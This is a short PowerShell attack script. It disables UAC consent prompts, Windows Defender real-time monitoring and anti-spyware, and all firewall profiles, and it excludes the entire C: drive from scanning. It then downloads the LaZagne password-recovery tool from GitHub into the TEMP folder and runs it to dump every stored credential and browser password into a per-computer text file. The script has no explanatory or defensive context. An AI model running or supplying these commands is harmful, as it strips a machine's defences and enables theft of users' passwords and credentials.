Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
Set-MpPreference -DisableRealtimeMonitoring $true
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
Add-MpPreference -ExclusionPath "C:"
$Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine');Start-BitsTransfer https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe -Destination "$Test/l.exe"; cd $Test
.\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"